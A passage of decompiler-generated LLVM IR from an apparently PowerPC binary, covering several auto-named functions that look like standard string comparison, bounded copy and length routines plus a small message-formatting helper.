  %v3_10006fb0 = load i8, i8* %v2_10006fb0, align 1
  %v1_10006fb4 = add i32 %v0_10006fb4, 1
  %v2_10006fb8 = inttoptr i32 %v1_10006fb4 to i8*
  %v3_10006fb8 = load i8, i8* %v2_10006fb8, align 1
  %v3_10006fc8 = icmp eq i8 %v3_10006fb0, 0
  %v1_10006fcc = add i32 %v0_10006fb0, 4
  %v1_10006fd0 = add i32 %v0_10006fb4, 3
  %v1_10006fd8 = add i32 %v0_10006fb4, 4
  store i32 %v1_10006fd8, i32* @r4, align 4
  %v4_10006fd4.not = icmp ne i8 %v3_10006fb0, %v3_10006fb8
  %brmerge20 = or i1 %v3_10006fc8, %v4_10006fd4.not
  br i1 %brmerge20, label %dec_label_pc_10006ffc, label %dec_label_pc_10006fe4

dec_label_pc_10006fe4:                            ; preds = %dec_label_pc_10006fb0
  %v1_10006fc4 = add i32 %v0_10006fb4, 2
  %v1_10006fbc = add i32 %v0_10006fb0, 2
  %v2_10006fe4 = inttoptr i32 %v1_10006fbc to i8*
  %v3_10006fe4 = load i8, i8* %v2_10006fe4, align 1
  %v2_10006fe8 = inttoptr i32 %v1_10006fc4 to i8*
  %v3_10006fe8 = load i8, i8* %v2_10006fe8, align 1
  %v3_10006fec = icmp eq i8 %v3_10006fe4, 0
  %v4_10006ff0.not = icmp ne i8 %v3_10006fe4, %v3_10006fe8
  %brmerge1 = or i1 %v3_10006fec, %v4_10006ff0.not
  br i1 %brmerge1, label %dec_label_pc_10006ffc, label %dec_label_pc_10007004

dec_label_pc_10006ffc:                            ; preds = %dec_label_pc_10006fb0, %dec_label_pc_10006fe4, %dec_label_pc_10006f94
  %v1_10006ffc.in = phi i8 [ %v3_10006fe4, %dec_label_pc_10006fe4 ], [ %v2_10006f94, %dec_label_pc_10006f94 ], [ %v3_10006fb0, %dec_label_pc_10006fb0 ]
  %v0_10006ffc.in = phi i8 [ %v3_10006fe8, %dec_label_pc_10006fe4 ], [ %v2_10006f9c, %dec_label_pc_10006f94 ], [ %v3_10006fb8, %dec_label_pc_10006fb0 ]
  %v0_10006ffc = zext i8 %v0_10006ffc.in to i32
  %v1_10006ffc = zext i8 %v1_10006ffc.in to i32
  %v2_10006ffc = sub nsw i32 %v1_10006ffc, %v0_10006ffc
  ret i32 %v2_10006ffc

dec_label_pc_10007004:                            ; preds = %dec_label_pc_10006fe4
  %v1_10007004 = add i32 %v0_10006fb0, 3
  %v2_10007004 = inttoptr i32 %v1_10007004 to i8*
  %v3_10007004 = load i8, i8* %v2_10007004, align 1
  %v4_10007004 = zext i8 %v3_10007004 to i32
  %v2_10007008 = inttoptr i32 %v1_10006fd0 to i8*
  %v3_10007008 = load i8, i8* %v2_10007008, align 1
  %v4_10007008 = zext i8 %v3_10007008 to i32
  %v3_1000700c = icmp eq i8 %v3_10007004, 0
  %v4_10007010.not = icmp ne i8 %v3_10007004, %v3_10007008
  %brmerge2 = or i1 %v3_1000700c, %v4_10007010.not
  br i1 %brmerge2, label %dec_label_pc_10007048, label %dec_label_pc_1000701c

dec_label_pc_1000701c:                            ; preds = %dec_label_pc_10007004
  %v1_1000701c = add i32 %v0_1000701c, -1
  %v2_1000701c = icmp eq i32 %v1_1000701c, 0
  br i1 %v2_1000701c, label %dec_label_pc_10007020, label %dec_label_pc_10006f94

dec_label_pc_10007020:                            ; preds = %dec_label_pc_1000701c
  %v1_10007020 = urem i32 %arg2, 4
  br label %dec_label_pc_10007050

dec_label_pc_10007028:                            ; preds = %dec_label_pc_10007058
  %v1_10007028 = inttoptr i32 %v0_10007028 to i8*
  %v2_10007028 = load i8, i8* %v1_10007028, align 1
  %v3_10007028 = zext i8 %v2_10007028 to i32
  %v1_1000702c = add i32 %v0_10007028, 1
  %v0_10007030 = load i32, i32* @r4, align 4
  %v1_10007030 = inttoptr i32 %v0_10007030 to i8*
  %v2_10007030 = load i8, i8* %v1_10007030, align 1
  %v3_10007030 = zext i8 %v2_10007030 to i32
  %v1_10007034 = add i32 %v0_10007030, 1
  store i32 %v1_10007034, i32* @r4, align 4
  %v3_10007038 = icmp eq i8 %v2_10007028, 0
  %v4_1000703c.not = icmp ne i8 %v2_10007028, %v2_10007030
  %brmerge3 = or i1 %v3_10007038, %v4_1000703c.not
  br i1 %brmerge3, label %dec_label_pc_10007048, label %dec_label_pc_10007058

dec_label_pc_10007048:                            ; preds = %dec_label_pc_10007004, %dec_label_pc_10007028
  %v1_10007048 = phi i32 [ %v3_10007028, %dec_label_pc_10007028 ], [ %v4_10007004, %dec_label_pc_10007004 ]
  %v0_10007048 = phi i32 [ %v3_10007030, %dec_label_pc_10007028 ], [ %v4_10007008, %dec_label_pc_10007004 ]
  %v2_10007048 = sub nsw i32 %v1_10007048, %v0_10007048
  ret i32 %v2_10007048

dec_label_pc_10007050:                            ; preds = %dec_label_pc_10006f78, %dec_label_pc_10007020
  %v1_1000705c19 = phi i32 [ 0, %dec_label_pc_10006f78 ], [ %v4_10007004, %dec_label_pc_10007020 ]
  %v0_1000705c17 = phi i32 [ 0, %dec_label_pc_10006f78 ], [ %v4_10007008, %dec_label_pc_10007020 ]
  %v0_1000702813 = phi i32 [ %tmp, %dec_label_pc_10006f78 ], [ %v1_10006fcc, %dec_label_pc_10007020 ]
  %v0_10007050 = phi i32 [ %arg2, %dec_label_pc_10006f78 ], [ %v1_10007020, %dec_label_pc_10007020 ]
  %v1_10007050 = add i32 %v0_10007050, 1
  br label %dec_label_pc_10007058

dec_label_pc_10007058:                            ; preds = %dec_label_pc_10007028, %dec_label_pc_10007050
  %v1_1000705c = phi i32 [ %v3_10007028, %dec_label_pc_10007028 ], [ %v1_1000705c19, %dec_label_pc_10007050 ]
  %v0_1000705c = phi i32 [ %v3_10007030, %dec_label_pc_10007028 ], [ %v0_1000705c17, %dec_label_pc_10007050 ]
  %v0_10007028 = phi i32 [ %v1_1000702c, %dec_label_pc_10007028 ], [ %v0_1000702813, %dec_label_pc_10007050 ]
  %v0_10007058 = phi i32 [ %v1_10007058, %dec_label_pc_10007028 ], [ %v1_10007050, %dec_label_pc_10007050 ]
  %v1_10007058 = add i32 %v0_10007058, -1
  %v2_10007058 = icmp eq i32 %v1_10007058, 0
  br i1 %v2_10007058, label %dec_label_pc_1000705c, label %dec_label_pc_10007028

dec_label_pc_1000705c:                            ; preds = %dec_label_pc_10007058
  %v2_1000705c = sub nsw i32 %v1_1000705c, %v0_1000705c
  ret i32 %v2_1000705c

; uselistorder directives
  uselistorder i32 %v1_10007058, { 1, 0 }
  uselistorder i32 %v3_10007030, { 1, 0 }
  uselistorder i32 %v3_10007028, { 1, 0 }
  uselistorder i32 %v1_1000701c, { 1, 0 }
  uselistorder i32 %v4_10007008, { 1, 0 }
  uselistorder i32 %v4_10007004, { 1, 0 }
  uselistorder i32 %v1_10006fd8, { 1, 0 }
  uselistorder i32 %v0_10006fb0, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_10006fb4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10007058, { 1, 0 }
  uselistorder label %dec_label_pc_10007050, { 1, 0 }
  uselistorder label %dec_label_pc_10007048, { 1, 0 }
  uselistorder label %dec_label_pc_10006ffc, { 1, 0, 2 }
}

define i32 @function_10007064(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007064:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v3_10007064 = icmp eq i32 %arg2, 3
  store i1 %v3_10007064, i1* %cr7_eq.global-to-local, align 1
  %v1_10007068 = add i32 %arg1, -1
  store i32 %v1_10007068, i32* %r10.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_100070e4, label %dec_label_pc_10007070

dec_label_pc_10007070:                            ; preds = %dec_label_pc_10007064
  %v1_10007070 = udiv i32 %arg2, 4
  store i32 %v1_10007070, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007078

dec_label_pc_10007078:                            ; preds = %dec_label_pc_100070c8, %dec_label_pc_10007070
  %v2_10007088 = phi i32 [ %v3_100070c0, %dec_label_pc_100070c8 ], [ %v1_10007068, %dec_label_pc_10007070 ]
  %v0_10007078 = load i32, i32* @r4, align 4
  %v1_10007078 = inttoptr i32 %v0_10007078 to i8*
  %v2_10007078 = load i8, i8* %v1_10007078, align 1
  %v1_1000707c = add i32 %v0_10007078, 1
  store i32 %v1_1000707c, i32* %r11.global-to-local, align 4
  %v1_10007080 = add i32 %v0_10007078, 2
  store i32 %v1_10007080, i32* %r8.global-to-local, align 4
  %v3_10007084 = icmp eq i8 %v2_10007078, 0
  store i1 %v3_10007084, i1* %cr7_eq.global-to-local, align 1
  %v3_10007088 = add i32 %v2_10007088, 1
  %v4_10007088 = inttoptr i32 %v3_10007088 to i8*
  store i8 %v2_10007078, i8* %v4_10007088, align 1
  store i32 %v3_10007088, i32* %r10.global-to-local, align 4
  %v0_1000708c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000708c, label %dec_label_pc_100070d0, label %dec_label_pc_10007090

dec_label_pc_10007090:                            ; preds = %dec_label_pc_10007078
  %v0_10007090 = load i32, i32* @r4, align 4
  %v1_10007090 = add i32 %v0_10007090, 1
  %v2_10007090 = inttoptr i32 %v1_10007090 to i8*
  %v3_10007090 = load i8, i8* %v2_10007090, align 1
  %v0_10007094 = load i32, i32* %r8.global-to-local, align 4
  %v1_10007098 = add i32 %v0_10007094, 2
  store i32 %v1_10007098, i32* @r4, align 4
  %v3_1000709c = icmp eq i8 %v3_10007090, 0
  store i1 %v3_1000709c, i1* %cr7_eq.global-to-local, align 1
  %v3_100070a0 = add i32 %v2_10007088, 2
  %v4_100070a0 = inttoptr i32 %v3_100070a0 to i8*
  store i8 %v3_10007090, i8* %v4_100070a0, align 1
  store i32 %v3_100070a0, i32* %r10.global-to-local, align 4
  %v0_100070a4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100070a4, label %dec_label_pc_100070d0, label %dec_label_pc_100070a8

dec_label_pc_100070a8:                            ; preds = %dec_label_pc_10007090
  %v0_100070a8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100070a8 = add i32 %v0_100070a8, 1
  %v2_100070a8 = inttoptr i32 %v1_100070a8 to i8*
  %v3_100070a8 = load i8, i8* %v2_100070a8, align 1
  %v3_100070ac = icmp eq i8 %v3_100070a8, 0
  store i1 %v3_100070ac, i1* %cr7_eq.global-to-local, align 1
  %v3_100070b0 = add i32 %v2_10007088, 3
  %v4_100070b0 = inttoptr i32 %v3_100070b0 to i8*
  store i8 %v3_100070a8, i8* %v4_100070b0, align 1
  store i32 %v3_100070b0, i32* %r10.global-to-local, align 4
  %v0_100070b4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100070b4, label %dec_label_pc_100070d0, label %dec_label_pc_100070b8

dec_label_pc_100070b8:                            ; preds = %dec_label_pc_100070a8
  %v0_100070b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100070b8 = add i32 %v0_100070b8, 1
  %v2_100070b8 = inttoptr i32 %v1_100070b8 to i8*
  %v3_100070b8 = load i8, i8* %v2_100070b8, align 1
  %v3_100070bc = icmp eq i8 %v3_100070b8, 0
  store i1 %v3_100070bc, i1* %cr7_eq.global-to-local, align 1
  %v3_100070c0 = add i32 %v2_10007088, 4
  %v4_100070c0 = inttoptr i32 %v3_100070c0 to i8*
  store i8 %v3_100070b8, i8* %v4_100070c0, align 1
  store i32 %v3_100070c0, i32* %r10.global-to-local, align 4
  %v0_100070c4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100070c4, label %dec_label_pc_100070d0, label %dec_label_pc_100070c8

dec_label_pc_100070c8:                            ; preds = %dec_label_pc_100070b8
  %v0_100070c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100070c8 = add i32 %v0_100070c8, -1
  store i32 %v1_100070c8, i32* %ctr.global-to-local, align 4
  %v2_100070c8 = icmp eq i32 %v1_100070c8, 0
  br i1 %v2_100070c8, label %dec_label_pc_100070e4, label %dec_label_pc_10007078

dec_label_pc_100070d0:                            ; preds = %dec_label_pc_100070b8, %dec_label_pc_100070a8, %dec_label_pc_10007090, %dec_label_pc_10007078
  %v1_100070d0 = phi i32 [ %v3_100070c0, %dec_label_pc_100070b8 ], [ %v3_100070b0, %dec_label_pc_100070a8 ], [ %v3_100070a0, %dec_label_pc_10007090 ], [ %v3_10007088, %dec_label_pc_10007078 ]
  %v2_100070d011 = sub i32 %arg1, %v1_100070d0
  %v2_100070d4 = add i32 %v2_100070d011, %arg2
  %v1_100070d8 = add i32 %v2_100070d4, -1
  store i32 %v1_100070d8, i32* %r11.global-to-local, align 4
  %v4_100070d8 = icmp eq i32 %v1_100070d8, 0
  %v0_100070dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100070d8, i32 %v0_100070dc)
  %v2_10007114.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000710c

dec_label_pc_100070e4:                            ; preds = %dec_label_pc_100070c8, %dec_label_pc_10007064
  %v1_100070e4 = urem i32 %arg2, 4
  store i32 %v1_100070e4, i32* %r11.global-to-local, align 4
  %v3_100070e4 = icmp eq i32 %v1_100070e4, 0
  %v0_100070e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100070e4, i32 %v0_100070e8)
  store i32 %v1_100070e4, i32* %ctr.global-to-local, align 4
  %v2_10007100.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100070f0

dec_label_pc_100070f0:                            ; preds = %dec_label_pc_10007108.dec_label_pc_100070f0_crit_edge, %dec_label_pc_100070e4
  %v2_10007100 = phi i32 [ %v3_10007100, %dec_label_pc_10007108.dec_label_pc_100070f0_crit_edge ], [ %v2_10007100.pre, %dec_label_pc_100070e4 ]
  %v0_100070f4 = phi i32 [ %v0_100070f4.pre, %dec_label_pc_10007108.dec_label_pc_100070f0_crit_edge ], [ %v1_100070e4, %dec_label_pc_100070e4 ]
  %v0_100070f0 = load i32, i32* @r4, align 4
  %v1_100070f0 = inttoptr i32 %v0_100070f0 to i8*
  %v2_100070f0 = load i8, i8* %v1_100070f0, align 1
  %v1_100070f4 = add i32 %v0_100070f4, -1
  store i32 %v1_100070f4, i32* %r11.global-to-local, align 4
  %v1_100070f8 = add i32 %v0_100070f0, 1
  store i32 %v1_100070f8, i32* @r4, align 4
  %v3_100070fc = icmp eq i8 %v2_100070f0, 0
  store i1 %v3_100070fc, i1* %cr7_eq.global-to-local, align 1
  %v3_10007100 = add i32 %v2_10007100, 1
  %v4_10007100 = inttoptr i32 %v3_10007100 to i8*
  store i8 %v2_100070f0, i8* %v4_10007100, align 1
  store i32 %v3_10007100, i32* %r10.global-to-local, align 4
  %v0_10007104 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007104 = add i32 %v0_10007104, -1
  store i32 %v1_10007104, i32* %ctr.global-to-local, align 4
  %v2_10007104 = icmp eq i32 %v1_10007104, 0
  br i1 %v2_10007104, label %dec_label_pc_1000711c, label %dec_label_pc_10007108

dec_label_pc_10007108:                            ; preds = %dec_label_pc_100070f0
  %v0_10007108 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007108, label %dec_label_pc_1000710c, label %dec_label_pc_10007108.dec_label_pc_100070f0_crit_edge

dec_label_pc_10007108.dec_label_pc_100070f0_crit_edge: ; preds = %dec_label_pc_10007108
  %v0_100070f4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100070f0

dec_label_pc_1000710c:                            ; preds = %dec_label_pc_10007108, %dec_label_pc_100070d0
  %v2_10007114.pre = phi i32 [ %v2_10007114.pre.pre, %dec_label_pc_100070d0 ], [ %v3_10007100, %dec_label_pc_10007108 ]
  %v0_1000710c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000710c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007110

dec_label_pc_10007110:                            ; preds = %dec_label_pc_10007110, %dec_label_pc_1000710c
  %v2_10007114 = phi i32 [ %v3_10007114, %dec_label_pc_10007110 ], [ %v2_10007114.pre, %dec_label_pc_1000710c ]
  %v3_10007114 = add i32 %v2_10007114, 1
  %v4_10007114 = inttoptr i32 %v3_10007114 to i8*
  store i8 0, i8* %v4_10007114, align 1
  store i32 %v3_10007114, i32* %r10.global-to-local, align 4
  %v0_10007118 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007118 = add i32 %v0_10007118, -1
  store i32 %v1_10007118, i32* %ctr.global-to-local, align 4
  %v2_10007118 = icmp eq i32 %v1_10007118, 0
  br i1 %v2_10007118, label %dec_label_pc_1000711c, label %dec_label_pc_10007110

dec_label_pc_1000711c:                            ; preds = %dec_label_pc_100070f0, %dec_label_pc_10007110
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10007118, { 1, 0 }
  uselistorder i32 %v3_10007114, { 1, 2, 0 }
  uselistorder i32 %v1_10007104, { 1, 0 }
  uselistorder i32 %v3_10007100, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100070e4, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100070c8, { 1, 0 }
  uselistorder i32 %v3_100070c0, { 0, 2, 3, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000711c, { 1, 0 }
}

define i32 @function_10007120(i8* %arg1) local_unnamed_addr {
dec_label_pc_10007120:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10007120 = load i32, i32* @r4, align 4
  %v3_10007120 = icmp eq i32 %v0_10007120, 0
  %v0_1000712c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007120, i32 %v0_1000712c)
  %v1_1000713c = load i32, i32* @r4, align 4
  %v2_1000713c = add i32 %v1_1000713c, %tmp
  %v3_10007140 = icmp ugt i32 %v2_1000713c, %tmp
  %v4_10007140 = icmp eq i32 %v1_1000713c, 0
  %v2_10007144 = or i1 %v4_10007140, %v3_10007140
  br i1 %v2_10007144, label %dec_label_pc_1000714c, label %dec_label_pc_10007148

dec_label_pc_10007134:                            ; preds = %dec_label_pc_100071b4
  br label %dec_label_pc_100071f8

dec_label_pc_10007148:                            ; preds = %dec_label_pc_10007120
  br label %dec_label_pc_1000714c

dec_label_pc_1000714c:                            ; preds = %dec_label_pc_10007120, %dec_label_pc_10007148
  %v0_100071fc = phi i32 [ %v2_1000713c, %dec_label_pc_10007120 ], [ -1, %dec_label_pc_10007148 ]
  %v1_1000717c6 = urem i32 %tmp, 4
  %v3_1000717c8 = icmp eq i32 %v1_1000717c6, 0
  br i1 %v3_1000717c8, label %dec_label_pc_10007184, label %dec_label_pc_10007154

dec_label_pc_10007154:                            ; preds = %dec_label_pc_1000714c, %dec_label_pc_10007178
  %v0_1000716c = phi i32 [ %v1_10007178, %dec_label_pc_10007178 ], [ %tmp, %dec_label_pc_1000714c ]
  %v1_10007154 = inttoptr i32 %v0_1000716c to i8*
  %v2_10007154 = load i8, i8* %v1_10007154, align 1
  %v3_10007158 = icmp eq i8 %v2_10007154, 0
  br i1 %v3_10007158, label %dec_label_pc_10007160, label %dec_label_pc_10007178

dec_label_pc_10007160:                            ; preds = %dec_label_pc_10007154
  %v3_10007160 = icmp ugt i32 %v0_100071fc, %v0_1000716c
  %v0_1000716c.v0_100071fc = select i1 %v3_10007160, i32 %v0_1000716c, i32 %v0_100071fc
  %v2_10007170 = sub i32 %v0_1000716c.v0_100071fc, %tmp
  ret i32 %v2_10007170

dec_label_pc_10007178:                            ; preds = %dec_label_pc_10007154
  %v1_10007178 = add i32 %v0_1000716c, 1
  %v1_1000717c = urem i32 %v1_10007178, 4
  %v3_1000717c = icmp eq i32 %v1_1000717c, 0
  br i1 %v3_1000717c, label %dec_label_pc_10007184, label %dec_label_pc_10007154

dec_label_pc_10007184:                            ; preds = %dec_label_pc_10007178, %dec_label_pc_1000714c
  %v0_10007188 = phi i32 [ %tmp, %dec_label_pc_1000714c ], [ %v1_10007178, %dec_label_pc_10007178 ]
  %v2_100071f03 = icmp ult i32 %v0_10007188, %v0_100071fc
  br i1 %v2_100071f03, label %dec_label_pc_10007194, label %dec_label_pc_100071f8

dec_label_pc_10007194:                            ; preds = %dec_label_pc_10007184, %dec_label_pc_100071ec
  %v0_10007134 = phi i32 [ %v1_10007198, %dec_label_pc_100071ec ], [ %v0_10007188, %dec_label_pc_10007184 ]
  %v1_10007194 = inttoptr i32 %v0_10007134 to i32*
  %v2_10007194 = load i32, i32* %v1_10007194, align 4
  %v1_10007198 = add i32 %v0_10007134, 4
  %v1_100071a0 = add i32 %v0_10007134, 1
  %v1_100071a8 = add i32 %v2_10007194, -16843009
  %v2_100071ac = and i32 %v1_100071a8, -2139062144
  %v5_100071ac = icmp eq i32 %v2_100071ac, 0
  br i1 %v5_100071ac, label %dec_label_pc_100071ec, label %dec_label_pc_100071b4

dec_label_pc_100071b4:                            ; preds = %dec_label_pc_10007194
  %v2_100071b4 = inttoptr i32 %v0_10007134 to i8*
  %v3_100071b4 = load i8, i8* %v2_100071b4, align 1
  %v3_100071b8 = icmp eq i8 %v3_100071b4, 0
  br i1 %v3_100071b8, label %dec_label_pc_10007134, label %dec_label_pc_100071c0

dec_label_pc_100071c0:                            ; preds = %dec_label_pc_100071b4
  %v2_100071c0 = inttoptr i32 %v1_100071a0 to i8*
  %v3_100071c0 = load i8, i8* %v2_100071c0, align 1
  %v3_100071c4 = icmp eq i8 %v3_100071c0, 0
  br i1 %v3_100071c4, label %dec_label_pc_100071f8, label %dec_label_pc_100071cc

dec_label_pc_100071cc:                            ; preds = %dec_label_pc_100071c0
  %v1_100071cc = add i32 %v0_10007134, 2
  %v2_100071cc = inttoptr i32 %v1_100071cc to i8*
  %v3_100071cc = load i8, i8* %v2_100071cc, align 1
  %v3_100071d4 = icmp eq i8 %v3_100071cc, 0
  br i1 %v3_100071d4, label %dec_label_pc_100071f8, label %dec_label_pc_100071dc

dec_label_pc_100071dc:                            ; preds = %dec_label_pc_100071cc
  %v1_100071dc = add i32 %v0_10007134, 3
  %v2_100071dc = inttoptr i32 %v1_100071dc to i8*
  %v3_100071dc = load i8, i8* %v2_100071dc, align 1
  %v3_100071e4 = icmp eq i8 %v3_100071dc, 0
  br i1 %v3_100071e4, label %dec_label_pc_100071f8, label %dec_label_pc_100071ec

dec_label_pc_100071ec:                            ; preds = %dec_label_pc_100071dc, %dec_label_pc_10007194
  %v2_100071f0 = icmp ult i32 %v1_10007198, %v0_100071fc
  br i1 %v2_100071f0, label %dec_label_pc_10007194, label %dec_label_pc_100071f8

dec_label_pc_100071f8:                            ; preds = %dec_label_pc_100071ec, %dec_label_pc_100071c0, %dec_label_pc_100071cc, %dec_label_pc_100071dc, %dec_label_pc_10007184, %dec_label_pc_10007134
  %v0_10007204 = phi i32 [ %v0_10007134, %dec_label_pc_10007134 ], [ %v0_10007188, %dec_label_pc_10007184 ], [ %v1_100071dc, %dec_label_pc_100071dc ], [ %v1_100071cc, %dec_label_pc_100071cc ], [ %v1_100071a0, %dec_label_pc_100071c0 ], [ %v0_100071fc, %dec_label_pc_100071ec ]
  %v3_100071f8 = icmp ugt i32 %v0_100071fc, %v0_10007204
  %v0_10007204.v0_100071fc = select i1 %v3_100071f8, i32 %v0_10007204, i32 %v0_100071fc
  %v2_10007208 = sub i32 %v0_10007204.v0_100071fc, %tmp
  ret i32 %v2_10007208

; uselistorder directives
  uselistorder i32 %v1_10007198, { 1, 0 }
  uselistorder i32 %v0_10007134, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_10007188, { 1, 0, 2 }
  uselistorder i32 %v1_10007178, { 1, 0, 2 }
  uselistorder i32 %v0_1000716c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_100071fc, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000713c, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_100071f8, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_10007194, { 1, 0 }
  uselistorder label %dec_label_pc_10007154, { 1, 0 }
  uselistorder label %dec_label_pc_1000714c, { 1, 0 }
}

define i32 @function_10007210(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007210:
  store i32 %arg1, i32* @r4, align 4
  store i32 268464680, i32* @lr, align 4
  %v0_10007224 = call i32 @function_10007240()
  %v0_1000722c = load i32, i32* @r29, align 4
  ret i32 %v0_1000722c
}

define i32 @function_10007240() local_unnamed_addr {
dec_label_pc_10007240:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_10007248 = load i32, i32* @r3, align 4
  %v2_10007248 = icmp ugt i32 %v0_10007248, 124
  %v0_10007250 = load i32, i32* @r4, align 4
  store i32 %v0_10007250, i32* %r27.global-to-local, align 4
  %v0_10007258 = load i32, i32* @r5, align 4
  br i1 %v2_10007248, label %dec_label_pc_1000729c, label %dec_label_pc_10007260

dec_label_pc_10007260:                            ; preds = %dec_label_pc_10007240
  store i32 ptrtoint ([8 x i8]* @global_var_1000e114.245 to i32), i32* %r30.global-to-local, align 4
  %v3_100072844 = icmp eq i32 %v0_10007248, 0
  br i1 %v3_100072844, label %dec_label_pc_10007290, label %dec_label_pc_10007270

dec_label_pc_10007270:                            ; preds = %dec_label_pc_10007260, %dec_label_pc_10007270
  %v0_10007274 = phi i32 [ %v1_10007274, %dec_label_pc_10007270 ], [ ptrtoint ([8 x i8]* @global_var_1000e114.245 to i32), %dec_label_pc_10007260 ]
  %v1_10007274 = add i32 %v0_10007274, 1
  store i32 %v1_10007274, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007270

dec_label_pc_10007290:                            ; preds = %dec_label_pc_10007260
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100072d0

dec_label_pc_1000729c:                            ; preds = %dec_label_pc_10007240
  %tmp = icmp slt i32 %v0_10007248, 0
  %v1_100072a0 = zext i1 %tmp to i32
  %v2_100072a0 = ashr i32 %v0_10007248, 31
  %v3_100072a0 = and i32 %v2_100072a0, -2
  %v4_100072a0 = or i32 %v3_100072a0, %v1_100072a0
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_100072b4 = bitcast i32* %stack_var_-39 to i8*
  %v6_100072b4 = call i32 @function_10009af4(i8* %v5_100072b4, i32 %v4_100072a0, i32 %v0_10007248, i32 -10, i32 0)
  %v1_100072bc = add i32 %v6_100072b4, -14
  store i32 %v1_100072bc, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1000e104.246 to i32), i32* @r4, align 4
  store i32 %v1_100072bc, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268464848, i32* @lr, align 4
  %v0_100072cc = call i32 @function_10006d88()
  %v0_100072d0.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_100072d4.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100072e4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100072d0

dec_label_pc_100072d0:                            ; preds = %dec_label_pc_10007290, %dec_label_pc_1000729c
  %v0_100072e4 = phi i32 [ %v0_10007258, %dec_label_pc_10007290 ], [ %v0_100072e4.pre, %dec_label_pc_1000729c ]
  %v0_100072d4 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1000e114.245 to i32), %dec_label_pc_10007290 ], [ %v0_100072d4.pre, %dec_label_pc_1000729c ]
  %v1_100072d8 = phi i32 [ %v0_10007250, %dec_label_pc_10007290 ], [ %v0_100072d0.pre, %dec_label_pc_1000729c ]
  %tmp21 = icmp slt i32 %v1_100072d8, 0
  %v1_100072d0 = zext i1 %tmp21 to i32
  %v2_100072d0 = ashr i32 %v1_100072d8, 31
  %v3_100072d0 = and i32 %v2_100072d0, -2
  %v4_100072d0 = or i32 %v3_100072d0, %v1_100072d0
  store i32 %v0_100072d4, i32* @r3, align 4
  %v2_100072d8 = xor i32 %v4_100072d0, %v1_100072d8
  %v2_100072dc = sub i32 %v4_100072d0, %v2_100072d8
  %tmp22 = icmp slt i32 %v2_100072dc, 0
  %v1_100072e0 = zext i1 %tmp22 to i32
  %v2_100072e0 = ashr i32 %v2_100072dc, 31
  %v3_100072e0 = and i32 %v2_100072e0, -2
  %v4_100072e0 = or i32 %v3_100072e0, %v1_100072e0
  %v2_100072e4 = and i32 %v4_100072e0, %v0_100072e4
  store i32 %v2_100072e4, i32* @r29, align 4
  %v0_100072e8 = call i32 @function_10006ed4()
  %v1_100072ec = add i32 %v0_100072e8, 1
  store i32 %v1_100072ec, i32* %r31.global-to-local, align 4
  %v1_100072f0 = load i32, i32* @r29, align 4
  %v3_100072f0 = icmp ugt i32 %v1_100072ec, %v1_100072f0
  br i1 %v3_100072f0, label %dec_label_pc_100072f8, label %dec_label_pc_10007300

dec_label_pc_100072f8:                            ; preds = %dec_label_pc_100072d0
  store i32 %v1_100072f0, i32* %r31.global-to-local, align 4
